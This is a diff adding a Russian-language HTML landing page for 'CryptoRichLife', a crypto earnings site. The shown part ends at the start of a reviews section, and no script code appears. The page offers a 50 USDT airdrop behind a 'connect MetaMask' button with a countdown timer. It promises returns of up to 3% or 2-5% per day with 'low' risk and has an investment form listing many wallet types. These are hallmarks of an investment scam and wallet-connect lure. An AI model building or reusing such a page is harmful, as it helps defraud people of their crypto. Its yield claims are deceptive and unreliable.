@@ -1,1 +1,1871 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CryptoRichLife - Премиум заработок в криптовалюте</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --main-bg: #0a0a1a;
+            --accent: #00f0ff;
+            --gold: #ffd700;
+            --platinum: #e5e4e2;
+            --gradient: linear-gradient(135deg, #00f0ff 0%, #5773ff 46%, #ff00c8 100%);
+            --glass: rgba(255, 255, 255, 0.05);
+            --dark-glass: rgba(0, 0, 0, 0.5);
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+        
+        body {
+            background: var(--main-bg);
+            color: #fff;
+            overflow-x: hidden;
+            background-image: 
+                radial-gradient(circle at 20% 30%, rgba(0, 240, 255, 0.1) 0%, transparent 40%),
+                radial-gradient(circle at 80% 70%, rgba(255, 0, 200, 0.1) 0%, transparent 40%);
+        }
+        
+        /* Навигация */
+        .header {
+            background: rgba(10, 10, 26, 0.9);
+            backdrop-filter: blur(15px);
+            padding: 20px 5%;
+            position: fixed;
+            width: 100%;
+            z-index: 1000;
+            border-bottom: 1px solid rgba(0, 240, 255, 0.2);
+            box-shadow: 0 5px 25px rgba(0, 0, 0, 0.2);
+        }
+        
+        .nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .logo {
+            font-size: 2.2em;
+            font-weight: 800;
+            background: var(--gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 20px rgba(0, 240, 255, 0.5);
+        }
+        
+        .nav-links {
+            display: flex;
+            gap: 40px;
+        }
+        
+        .nav-links a {
+            color: var(--platinum);
+            text-decoration: none;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            position: relative;
+            padding: 8px 0;
+        }
+        
+        .nav-links a:after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background: var(--gradient);
+            transition: width 0.3s ease;
+        }
+        
+        .nav-links a:hover {
+            color: var(--accent);
+        }
+        
+        .nav-links a:hover:after {
+            width: 100%;
+        }
+        
+        .nav-links a.active {
+            color: var(--accent);
+        }
+        
+        .nav-links a.active:after {
+            width: 100%;
+        }
+        
+        /* Основной контент */
+        .main-content {
+            min-height: 100vh;
+            padding: 120px 5% 80px;
+        }
+        
+        .page {
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        .page.active {
+            display: block;
+        }
+        
+        /* Геройская секция с аирдропом */
+        .hero {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            position: relative;
+            overflow: hidden;
+            padding-top: 60px;
+        }
+        
+        .hero-content {
+            max-width: 800px;
+            z-index: 2;
+            margin-top: 40px;
+        }
+        
+        .hero-content h1 {
+            font-size: 4.5em;
+            font-weight: 800;
+            line-height: 1.2;
+            margin-bottom: 30px;
+            background: linear-gradient(135deg, #fff 0%, var(--accent) 50%, #9d4edd 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .hero-content p {
+            font-size: 1.4em;
+            margin-bottom: 40px;
+            color: var(--platinum);
+            max-width: 600px;
+        }
+        
+        .btn {
+            background: var(--gradient);
+            color: white;
+            padding: 18px 45px;
+            border: none;
+            border-radius: 50px;
+            font-size: 1.2em;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: inline-block;
+            box-shadow: 0 10px 30px rgba(0, 240, 255, 0.4);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .btn:before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: all 0.6s ease;
+            z-index: 1;
+        }
+        
+        .btn:hover:before {
+            left: 100%;
+        }
+        
+        .btn:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 40px rgba(0, 240, 255, 0.6);
+        }
+        
+        .btn-secondary {
+            background: transparent;
+            border: 2px solid var(--accent);
+            color: var(--accent);
+            box-shadow: none;
+        }
+        
+        .btn-secondary:hover {
+            background: rgba(0, 240, 255, 0.1);
+        }
+        
+        /* Блок аирдропа на главной */
+        .airdrop-banner {
+            background: var(--glass);
+            border-radius: 20px;
+            padding: 30px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            margin: 40px 0;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .airdrop-banner:before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: var(--gradient);
+            opacity: 0.1;
+            z-index: -1;
+        }
+        
+        .airdrop-banner h2 {
+            font-size: 2.5em;
+            margin-bottom: 20px;
+            color: var(--accent);
+        }
+        
+        .airdrop-banner p {
+            font-size: 1.2em;
+            margin-bottom: 25px;
+            color: var(--platinum);
+        }
+        
+        .airdrop-timer {
+            font-size: 1.8em;
+            margin: 20px 0;
+            color: var(--accent);
+        }
+        
+        .airdrop-progress {
+            height: 20px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        
+        .airdrop-progress-bar {
+            height: 100%;
+            background: var(--gradient);
+            border-radius: 10px;
+            width: 65%;
+            transition: width 1s ease;
+        }
+        
+        .wallet-connect-section {
+            margin-top: 30px;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 15px;
+        }
+        
+        .wallet-connected {
+            display: none;
+            margin-top: 20px;
+            padding: 20px;
+            background: rgba(0, 240, 255, 0.1);
+            border-radius: 15px;
+            text-align: left;
+        }
+        
+        .wallet-connected h3 {
+            color: var(--accent);
+            margin-bottom: 15px;
+        }
+        
+        .wallet-info {
+            margin-bottom: 15px;
+        }
+        
+        /* Элементы роскоши */
+        .luxury-elements {
+            position: absolute;
+            z-index: 1;
+        }
+        
+        .luxury-1 {
+            top: 15%;
+            right: 10%;
+            font-size: 3em;
+            color: var(--gold);
+            animation: float 6s ease-in-out infinite;
+        }
+        
+        .luxury-2 {
+            bottom: 20%;
+            left: 8%;
+            font-size: 3em;
+            color: var(--accent);
+            animation: float 8s ease-in-out infinite;
+        }
+        
+        .luxury-3 {
+            top: 40%;
+            right: 25%;
+            font-size: 2.5em;
+            color: var(--platinum);
+            animation: rotate 15s linear infinite;
+        }
+        
+        .luxury-4 {
+            top: 70%;
+            right: 15%;
+            font-size: 3em;
+            color: var(--gold);
+            animation: float 7s ease-in-out infinite;
+        }
+        
+        .luxury-5 {
+            top: 25%;
+            left: 15%;
+            font-size: 2.5em;
+            color: var(--accent);
+            animation: float 9s ease-in-out infinite;
+        }
+        
+        .luxury-6 {
+            bottom: 30%;
+            right: 30%;
+            font-size: 3em;
+            color: var(--platinum);
+            animation: rotate 12s linear infinite;
+        }
+        
+        /* Секция возможностей */
+        .features {
+            padding: 100px 5%;
+            position: relative;
+        }
+        
+        .section-title {
+            text-align: center;
+            font-size: 3em;
+            margin-bottom: 80px;
+            background: linear-gradient(135deg, #fff 0%, var(--accent) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 40px;
+        }
+        
+        .feature-card {
+            background: var(--glass);
+            border-radius: 25px;
+            padding: 40px 30px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: all 0.4s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .feature-card:before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: var(--gradient);
+            opacity: 0;
+            z-index: -1;
+            transition: opacity 0.4s ease;
+        }
+        
+        .feature-card:hover {
+            transform: translateY(-15px);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+        }
+        
+        .feature-card:hover:before {
+            opacity: 0.1;
+        }
+        
+        .feature-icon {
+            font-size: 3em;
+            margin-bottom: 25px;
+            background: var(--gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .feature-card h3 {
+            font-size: 1.8em;
+            margin-bottom: 20px;
+            color: var(--accent);
+        }
+        
+        .feature-card p {
+            color: var(--platinum);
+            line-height: 1.6;
+        }
+        
+        /* Секция роскошной жизни */
+        .luxury-life {
+            padding: 100px 5%;
+            background: rgba(0, 0, 0, 0.2);
+            position: relative;
+        }
+        
+        .luxury-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
+            margin-top: 60px;
+        }
+        
+        .luxury-item {
+            border-radius: 20px;
+            overflow: hidden;
+            position: relative;
+            height: 300px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
+        }
+        
+        .luxury-item img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transition: transform 0.5s ease;
+        }
+        
+        .luxury-item:hover img {
+            transform: scale(1.1);
+        }
+        
+        .luxury-overlay {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            padding: 30px;
+            background: linear-gradient(to top, rgba(0, 0, 0, 0.8), transparent);
+        }
+        
+        .luxury-overlay h3 {
+            font-size: 1.5em;
+            margin-bottom: 10px;
+            color: var(--gold);
+        }
+        
+        /* Формы */
+        .form-container {
+            background: var(--glass);
+            border-radius: 25px;
+            padding: 50px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        
+        .form-group {
+            margin-bottom: 30px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: 600;
+            color: var(--accent);
+        }
+        
+        .form-group input,
+        .form-group select,
+        .form-group textarea {
+            width: 100%;
+            padding: 15px 20px;
+            border-radius: 10px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            background: rgba(0, 0, 0, 0.2);
+            color: #fff;
+            font-size: 1em;
+            transition: all 0.3s ease;
+        }
+        
+        .form-group input:focus,
+        .form-group select:focus,
+        .form-group textarea:focus {
+            outline: none;
+            border-color: var(--accent);
+            box-shadow: 0 0 15px rgba(0, 240, 255, 0.3);
+        }
+        
+        /* Отзывы */
+        .review-card {
+            display: flex;
+            flex-direction: column;
+            background: var(--glass);
+            border-radius: 25px;
+            padding: 30px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: all 0.4s ease;
+        }
+        
+        .review-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        
+        .review-avatar {
+            width: 70px;
+            height: 70px;
+            border-radius: 50%;
+            object-fit: cover;
+            margin-right: 20px;
+            border: 3px solid var(--accent);
+        }
+        
+        .review-info h3 {
+            font-size: 1.4em;
+            margin-bottom: 5px;
+            color: var(--accent);
+        }
+        
+        .review-country {
+            color: var(--platinum);
+            font-size: 0.9em;
+            display: flex;
+            align-items: center;
+        }
+        
+        .review-country i {
+            margin-right: 5px;
+        }
+        
+        .review-content {
+            color: var(--platinum);
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+        
+        .review-rating {
+            color: var(--gold);
+            font-size: 1.2em;
+            margin-top: auto;
+        }
+        
+        /* Страница аирдропа */
+        .airdrop-section {
+            padding: 100px 5%;
+            text-align: center;
+        }
+        
+        /* Кошельки */
+        .wallets-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 25px;
+            margin-top: 40px;
+        }
+        
+        .wallet-card {
+            background: var(--glass);
+            border-radius: 20px;
+            padding: 25px;
+            text-align: center;
+            transition: all 0.3s ease;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            cursor: pointer;
+        }
+        
+        .wallet-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 15px 30px rgba(0, 240, 255, 0.3);
+            border-color: var(--accent);
+        }
+        
+        .wallet-icon {
+            font-size: 3.5em;
+            margin-bottom: 15px;
+            background: var(--gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .wallet-card h3 {
+            font-size: 1.3em;
+            margin-bottom: 10px;
+            color: var(--accent);
+        }
+        
+        /* Футер */
+        .footer {
+            background: rgba(5, 5, 15, 0.95);
+            padding: 60px 5% 30px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .footer-content {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 40px;
+            margin-bottom: 40px;
+        }
+        
+        .footer-column h3 {
+            font-size: 1.4em;
+            margin-bottom: 25px;
+            color: var(--accent);
+        }
+        
+        .footer-links {
+            list-style: none;
+        }
+        
+        .footer-links li {
+            margin-bottom: 15px;
+        }
+        
+        .footer-links a {
+            color: var(--platinum);
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+        
+        .footer-links a:hover {
+            color: var(--accent);
+        }
+        
+        .copyright {
+            text-align: center;
+            padding-top: 30px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            color: var(--platinum);
+        }
+        
+        /* Анимации */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        @keyframes float {
+            0% { transform: translateY(0) rotate(0deg); }
+            50% { transform: translateY(-20px) rotate(5deg); }
+            100% { transform: translateY(0) rotate(0deg); }
+        }
+        
+        @keyframes rotate {
+            0% { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+        
+        /* Адаптивность */
+        @media (max-width: 992px) {
+            .hero-content h1 {
+                font-size: 3.5em;
+            }
+            
+            .nav-links {
+                gap: 25px;
+            }
+        }
+        
+        @media (max-width: 768px) {
+            .hero-content h1 {
+                font-size: 2.8em;
+            }
+            
+            .nav {
+                flex-direction: column;
+                gap: 20px;
+            }
+            
+            .nav-links {
+                gap: 15px;
+                flex-wrap: wrap;
+                justify-content: center;
+            }
+            
+            .features-grid, .luxury-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .form-container {
+                padding: 30px 20px;
+            }
+            
+            .review-header {
+                flex-direction: column;
+                text-align: center;
+            }
+            
+            .review-avatar {
+                margin-right: 0;
+                margin-bottom: 15px;
+            }
+            
+            .airdrop-banner h2 {
+                font-size: 2em;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <nav class="nav">
+            <div class="logo">CryptoRichLife</div>
+            <div class="nav-links">
+                <a href="#" class="nav-link active" data-page="home">Главная</a>
+                <a href="#" class="nav-link" data-page="earn">Заработок</a>
+                <a href="#" class="nav-link" data-page="reviews">Отзывы</a>
+                <a href="#" class="nav-link" data-page="wallet">Кошелек</a>
+                <a href="#" class="nav-link" data-page="airdrop">Аирдроп</a>
+                <a href="#" class="nav-link" data-page="contact">Контакты</a>
+            </div>
+        </nav>
+    </header>
 
+    <main class="main-content">
+        <!-- Главная страница -->
+        <section id="home" class="page active">
+            <div class="hero">
+                <div class="luxury-elements luxury-1">
+                    <i class="fas fa-gem"></i>
+                </div>
+                <div class="luxury-elements luxury-2">
+                    <i class="fas fa-car"></i>
+                </div>
+                <div class="luxury-elements luxury-3">
+                    <i class="fas fa-ring"></i>
+                </div>
+                <div class="luxury-elements luxury-4">
+                    <i class="fas fa-crown"></i>
+                </div>
+                <div class="luxury-elements luxury-5">
+                    <i class="fas fa-plane"></i>
+                </div>
+                <div class="luxury-elements luxury-6">
+                    <i class="fas fa-yacht"></i>
+                </div>
+                
+                <div class="hero-content">
+                    <h1>Премиум жизнь с криптовалютой</h1>
+                    <p>Зарабатывайте на криптовалюте и получите доступ к эксклюзивному образу жизни, о котором вы всегда мечтали.</p>
+                    <a href="#" class="btn" data-page="earn">Начать зарабатывать</a>
+                </div>
+            </div>
+
+            <!-- Аирдроп на главной -->
+            <div class="airdrop-banner">
+                <h2>Аирдроп: Получите 50 USDT за регистрацию!</h2>
+                <p>Присоединяйтесь к нашей программе и получите бесплатные USDT за выполнение простых заданий</p>
+                
+                <div class="airdrop-timer">
+                    До конца акции: <span id="homeCountdown">23:59:59</span>
+                </div>
+                
+                <div class="airdrop-progress">
+                    <div class="airdrop-progress-bar"></div>
+                </div>
+                <p>65% токенов уже распределено</p>
+                
+                <div class="wallet-connect-section">
+                    <p>Для участия подключите ваш кошелек</p>
+                    <button class="btn" id="connectWalletBtn">Подключить MetaMask</button>
+                </div>
+                
+                <div class="wallet-connected" id="walletConnected">
+                    <h3>Кошелек подключен!</h3>
+                    <div class="wallet-info">
+                        <p>Адрес: <span id="walletAddress"></span></p>
+                        <p>Баланс: <span id="walletBalance"></span></p>
+                        <p>Сеть: <span id="walletNetwork"></span></p>
+                    </div>
+                    <button class="btn" id="claimAirdropBtn">Получить 50 USDT</button>
+                </div>
+            </div>
+
+            <section class="features">
+                <h2 class="section-title">Наши возможности</h2>
+                <div class="features-grid">
+                    <div class="feature-card">
+                        <div class="feature-icon">
+                            <i class="fas fa-coins"></i>
+                        </div>
+                        <h3>Премиум стейкинг</h3>
+                        <p>Получайте до 45% годовых с нашими эксклюзивными предложениями по стейкингу для избранных клиентов.</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">
+                            <i class="fas fa-server"></i>
+                        </div>
+                        <h3>Элитный майнинг</h3>
+                        <p>Доступ к эксклюзивным майнинг-пулам с минимальной комиссией и максимальной доходностью.</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">
+                            <i class="fas fa-chart-line"></i>
+                        </div>
+                        <h3>VIP трейдинг</h3>
+                        <p>Эксклюзивные торговые сигналы и стратегии от лучших трейдеров с многолетним опытом.</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">
+                            <i class="fas fa-sync-alt"></i>
+                        </div>
+                        <h3>Арбитраж</h3>
+                        <p>Автоматический арбитраж между биржами с доходностью до 3% в день.</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">
+                            <i class="fas fa-piggy-bank"></i>
+                        </div>
+                        <h3>Сберегательные счета</h3>
+                        <p>Высокие проценты на крипто-депозиты с ежедневной капитализацией.</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">
+                            <i class="fas fa-hand-holding-usd"></i>
+                        </div>
+                        <h3>Кредитование</h3>
+                        <p>Зарабатывайте на процентах, предоставляя кредиты другим трейдерам.</p>
+                    </div>
+                </div>
+            </section>
+
+            <section class="luxury-life">
+                <h2 class="section-title">Жизнь мечты</h2>
+                <div class="luxury-grid">
+                    <div class="luxury-item">
+                        <img src="https://images.unsplash.com/photo-1512917774080-9991f1c4c750?auto=format&fit=crop&w=800" alt="Роскошная вилла" onerror="this.src='data:image/svg+xml;charset=UTF-8,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'800\' height=\'600\' viewBox=\'0 0 800 600\'%3E%3Crect fill=\'%2300f0ff\' width=\'800\' height=\'600\'/%3E%3Ctext fill=\'%23ffffff\' font-family=\'Arial\' font-size=\'30\' x=\'50%25\' y=\'50%25\' text-anchor=\'middle\'%3EРоскошная вилла%3C/text%3E%3C/svg%3E'">
+                        <div class="luxury-overlay">
+                            <h3>Элитная недвижимость</h3>
+                            <p>Виллы и апартаменты в самых престижных локациях</p>
+                        </div>
+                    </div>
+                    <div class="luxury-item">
+                        <img src="https://images.unsplash.com/photo-1544636331-e26879cd4d9b?auto=format&fit=crop&w=800" alt="Премиум автомобиль" onerror="this.src='data:image/svg+xml;charset=UTF-8,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'800\' height=\'600\' viewBox=\'0 0 800 600\'%3E%3Crect fill=\'%235773ff\' width=\'800\' height=\'600\'/%3E%3Ctext fill=\'%23ffffff\' font-family=\'Arial\' font-size=\'30\' x=\'50%25\' y=\'50%25\' text-anchor=\'middle\'%3EПремиум автомобиль%3C/text%3E%3C/svg%3E'">
+                        <div class="luxury-overlay">
+                            <h3>Эксклюзивные автомобили</h3>
+                            <p>Коллекция роскошных автомобилей премиум-класса</p>
+                        </div>
+                    </div>
+                    <div class="luxury-item">
+                        <img src="https://images.unsplash.com/photo-1566073771259-6a8506099945?auto=format&fit=crop&w=800" alt="Яхта" onerror="this.src='data:image/svg+xml;charset=UTF-8,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'800\' height=\'600\' viewBox=\'0 0 800 600\'%3E%3Crect fill=\'%23ff00c8\' width=\'800\' height=\'600\'/%3E%3Ctext fill=\'%23ffffff\' font-family=\'Arial\' font-size=\'30\' x=\'50%25\' y=\'50%25\' text-anchor=\'middle\'%3EЯхта%3C/text%3E%3C/svg%3E'">
+                        <div class="luxury-overlay">
+                            <h3>Яхтинг</h3>
+                            <p>Путешествия на частных яхтах по всему миру</p>
+                        </div>
+                    </div>
+                    <div class="luxury-item">
+                        <img src="https://images.unsplash.com/photo-1436491865332-7a61a109cc05?auto=format&fit=crop&w=800" alt="Частный самолет" onerror="this.src='data:image/svg+xml;charset=UTF-8,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'800\' height=\'600\' viewBox=\'0 0 800 600\'%3E%3Crect fill=\'%2300f0ff\' width=\'800\' height=\'600\'/%3E%3Ctext fill=\'%23ffffff\' font-family=\'Arial\' font-size=\'30\' x=\'50%25\' y=\'50%25\' text-anchor=\'middle\'%3EЧастный самолет%3C/text%3E%3C/svg%3E'">
+                        <div class="luxury-overlay">
+                            <h3>Частная авиация</h3>
+                            <p>Перелеты на частных самолетах в любую точку мира</p>
+                        </div>
+                    </div>
+                    <div class="luxury-item">
+                        <img src="https://images.unsplash.com/photo-1596726895343-5b2f2b1bff3a?auto=format&fit=crop&w=800" alt="Роскошные часы" onerror="this.src='data:image/svg+xml;charset=UTF-8,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'800\' height=\'600\' viewBox=\'0 0 800 600\'%3E%3Crect fill=\'%235773ff\' width=\'800\' height=\'600\'/%3E%3Ctext fill=\'%23ffffff\' font-family=\'Arial\' font-size=\'30\' x=\'50%25\' y=\'50%25\' text-anchor=\'middle\'%3EРоскошные часы%3C/text%3E%3C/svg%3E'">
+                        <div class="luxury-overlay">
+                            <h3>Эксклюзивные аксессуары</h3>
+                            <p>Часы и украшения от ведущих мировых брендов</p>
+                        </div>
+                    </div>
+                    <div class="luxury-item">
+                        <img src="https://images.unsplash.com/photo-1565299624946-b28f40a0ae38?auto=format&fit=crop&w=800" alt="Гастрономия" onerror="this.src='data:image/svg+xml;charset=UTF-8,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'800\' height=\'600\' viewBox=\'0 0 800 600\'%3E%3Crect fill=\'%23ff00c8\' width=\'800\' height=\'600\'/%3E%3Ctext fill=\'%23ffffff\' font-family=\'Arial\' font-size=\'30\' x=\'50%25\' y=\'50%25\' text-anchor=\'middle\'%3EГастрономия%3C/text%3E%3C/svg%3E'">
+                        <div class="luxury-overlay">
+                            <h3>Мишленовские рестораны</h3>
+                            <p>Ужины в лучших ресторанах мира со звездами Мишлен</p>
+                        </div>
+                    </div>
+                </div>
+            </section>
+        </section>
+
+        <!-- Страница заработка -->
+        <section id="earn" class="page">
+            <div class="hero">
+                <div class="hero-content">
+                    <h1>Способы заработка</h1>
+                    <p>Выберите подходящий для вас метод заработка криптовалюты и начните свой путь к финансовой свободе.</p>
+                </div>
+            </div>
+
+            <section class="features">
+                <h2 class="section-title">Доступные методы</h2>
+                <div class="features-grid">
+                    <div class="feature-card">
+                        <div class="feature-icon">
+                            <i class="fas fa-coins"></i>
+                        </div>
+                        <h3>Стейкинг</h3>
+                        <p><strong>Как это работает:</strong> Вы блокируете свои монеты в сети для поддержания работы блокчейна и получаете вознаграждение. Это пассивный доход без активного участия.</p>
+                        <p><strong>Доходность:</strong> 15-45% годовых</p>
+                        <p><strong>Минимальная сумма:</strong> 1000 USDT</p>
+                        <p><strong>Риски:</strong> Низкие, зависит от стабильности сети</p>
+                        <a href="#" class="btn" style="margin-top: 20px;">Начать стейкинг</a>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">
+                            <i class="fas fa-server"></i>
+                        </div>
+                        <h3>Майнинг</h3>
+                        <p><strong>Как это работает:</strong> Аренда вычислительных мощностей для добычи криптовалюты. Мы предоставляем оборудование, вы получаете долю от добытых монет.</p>
+                        <p><strong>Доходность:</strong> 5-15% в месяц</p>
+                        <p><strong>Минимальная сумма:</strong> 500 USDT</p>
+                        <p><strong>Риски:</strong> Средние, зависит от сложности сети</p>
+                        <a href="#" class="btn" style="margin-top: 20px;">Начать майнинг</a>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">
+                            <i class="fas fa-chart-line"></i>
+                        </div>
+                        <h3>Трейдинг</h3>
+                        <p><strong>Как это работает:</strong> Автоматические торговые роботы анализируют рынок 24/7 и совершают сделки по выгодных ценах. Доход формируется от разницы курсов.</p>
+                        <p><strong>Доходность:</strong> 3-8% в месяц</p>
+                        <p><strong>Минимальная сумма:</strong> 200 USDT</p>
+                        <p><strong>Риски:</strong> Высокие, зависит от волатильности рынка</p>
+                        <a href="#" class="btn" style="margin-top: 20px;">Начать трейдинг</a>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">
+                            <i class="fas fa-sync-alt"></i>
+                        </div>
+                        <h3>Арбитраж</h3>
+                        <p><strong>Как это работает:</strong> Автоматическая покупка криптовалюты на одной бирже по низкой цене и продажа на другой по высокой. Система сама находит лучшие возможности.</p>
+                        <p><strong>Доходность:</strong> 2-5% в день</p>
+                        <p><strong>Минимальная сумма:</strong> 1000 USDT</p>
+                        <p><strong>Риски:</strong> Низкие, но требуются большие объемы</p>
+                        <a href="#" class="btn" style="margin-top: 20px;">Начать арбитраж</a>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">
+                            <i class="fas fa-seedling"></i>
+                        </div>
+                        <h3>Yield Farming</h3>
+                        <p><strong>Как это работает:</strong> Предоставление ликвидности в DeFi-пулы и получение процентов от комиссий за транзакции. Высокая доходность в новых проектов.</p>
+                        <p><strong>Доходность:</strong> 20-100% годовых</p>
+                        <p><strong>Минимальная сумма:</strong> 1500 USDT</p>
+                        <p><strong>Риски:</strong> Высокие, из-за нестабильности новых проектов</p>
+                        <a href="#" class="btn" style="margin-top: 20px;">Начать фарминг</a>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">
+                            <i class="fas fa-palette"></i>
+                        </div>
+                        <h3>NFT инвестиции</h3>
+                        <p><strong>Как это работает:</strong> Покупка и продажа цифровых коллекционных предметов. Мы анализируем рынок и находим перспективные NFT для инвестирования.</p>
+                        <p><strong>Доходность:</strong> 10-500% за сделки</p>
+                        <p><strong>Минимальная сумму:</strong> 800 USDT</p>
+                        <p><strong>Риски:</strong> Очень высокие, но и потенциал большой</p>
+                        <a href="#" class="btn" style="margin-top: 20px;">Инвестировать в NFT</a>
+                    </div>
+                </div>
+            </section>
+
+            <section class="form-container">
+                <h2 class="section-title">Выбор метода заработка</h2>
+                <form id="earnForm">
+                    <div class="form-group">
+                        <label for="earnMethod">Выберите метод заработка:</label>
+                        <select id="earnMethod" required>
+                            <option value="">-- Выберите метод --</option>
+                            <option value="staking">Стейкинг (от 1000 USDT)</option>
+                            <option value="mining">Майнинг (от 500 USDT)</option>
+                            <option value="trading">Трейдинг (от 200 USDT)</option>
+                            <option value="arbitrage">Арбитраж (от 1000 USDT)</option>
+                            <option value="yield">Yield Farming (от 1500 USDT)</option>
+                            <option value="nft">NFT инвестиции (от 800 USDT)</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label for="investment">Сумма инвестиций (USDT):</label>
+                        <input type="number" id="investment" min="100" step="50" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="walletType">Тип кошелька:</label>
+                        <select id="walletType" required>
+                            <option value="">-- Выберите кошелек --</option>
+                            <option value="metamask">MetaMask</option>
+                            <option value="trust">Trust Wallet</option>
+                            <option value="binance">Binance Chain Wallet</option>
+                            <option value="coinbase">Coinbase Wallet</option>
+                            <option value="exodus">Exodus</option>
+                            <option value="ledger">Ledger Live</option>
+                            <option value="trezor">Trezor Suite</option>
+                            <option value="phantom">Phantom</option>
+                            <option value="other">Другой</option>
+                        </select>
+                    </div>
+                    <button type="submit" class="btn">Начать зарабатывать</button>
+                </form>
+            </section>
+        </section>
+
+        <!-- Страница отзывов -->
+        <section id="reviews" class="page">
+            <div class="hero">
+                <div class="hero-content">
+                    <h1>Отзывы клиентов</h1>
+                    <p>Реальные истории успеха наших клиентов со всего мира, которые уже достигли финансовой свободы.</p>
+                </div>
+            </div>
+
+            <section class="features">
+                <h2 class="section-title">Истории успеха</h2>
+                <div class="features-grid">
+                    <div class="review-card">
+                        <div class="review-header">
